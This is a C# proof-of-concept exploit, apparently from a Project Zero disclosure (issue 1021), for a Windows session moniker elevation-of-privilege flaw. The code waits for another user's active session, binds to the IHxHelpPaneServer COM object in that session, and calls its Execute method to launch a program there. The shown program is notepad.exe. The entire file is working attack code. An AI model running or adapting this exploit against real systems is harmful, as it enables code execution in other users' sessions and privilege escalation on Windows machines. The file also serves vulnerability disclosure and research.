// https://bugs.chromium.org/p/project-zero/issues/detail?id=1021

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;

namespace PoC_SessionMoniker_EoP
{
    class Program
    {
        [ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IHxHelpPaneServer
        {
            void DisplayTask(string task);
            void DisplayContents(string contents);
            void DisplaySearchResults(string search);
            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
        }

        enum WTS_CONNECTSTATE_CLASS
        {
            WTSActive,              // User logged on to WinStation
            WTSConnected,           // WinStation connected to client
            WTSConnectQuery,        // In the process of connecting to client
            WTSShadow,              // Shadowing another WinStation
            WTSDisconnected,        // WinStation logged on without client
            WTSIdle,                // Waiting for client to connect
            WTSListen,              // WinStation is listening for connection
            WTSReset,               // WinStation is being reset
            WTSDown,                // WinStation is down due to error
            WTSInit,                // WinStation in initialization
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WTS_SESSION_INFO
        {
            public int SessionId;
            public IntPtr pWinStationName;
            public WTS_CONNECTSTATE_CLASS State;
        }

        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern bool WTSEnumerateSessions(
                IntPtr hServer,
                int Reserved,
                int Version,
                out IntPtr ppSessionInfo,
                out int pCount);

        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern void WTSFreeMemory(IntPtr memory);

        public static IEnumerable<int> GetSessionIds()
        {
            List<int> sids = new List<int>();
            IntPtr pSessions = IntPtr.Zero;
            int dwSessionCount = 0;
            try
            {
                if (WTSEnumerateSessions(IntPtr.Zero, 0, 1, out pSessions, out dwSessionCount))
                {
                    IntPtr current = pSessions;
                    for (int i = 0; i < dwSessionCount; ++i)
                    {
                        WTS_SESSION_INFO session_info = (WTS_SESSION_INFO)Marshal.PtrToStructure(current, typeof(WTS_SESSION_INFO));
                        
                        if (session_info.State == WTS_CONNECTSTATE_CLASS.WTSActive)
                        {
                            if (session_info.SessionId != 0)
                            {
                                sids.Add(session_info.SessionId);
                            }
                        }
                        current += Marshal.SizeOf(typeof(WTS_SESSION_INFO));
                    }
                }
            }
            finally
            {
                if (pSessions != IntPtr.Zero)
                {
                    WTSFreeMemory(pSessions);
                }
            }

            return sids;
        }

        static void Main(string[] args)
        {
            try
            {
                int current_session_id = Process.GetCurrentProcess().SessionId;
                int new_session_id = 0;
                Console.WriteLine("Waiting For a Target Session");
                while (true)
                {
                    IEnumerable<int> sessions = GetSessionIds().Where(id => id != current_session_id);
                    if (sessions.Count() > 0)
                    {
                        new_session_id = sessions.First();
                        break;
                    }
                    Thread.Sleep(1000);
                }
                
                Console.WriteLine("Creating Process in Session {0} after 20secs", new_session_id);
                Thread.Sleep(20000);
                IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
                Uri target = new Uri(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe"));
                server.Execute(target.AbsoluteUri);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
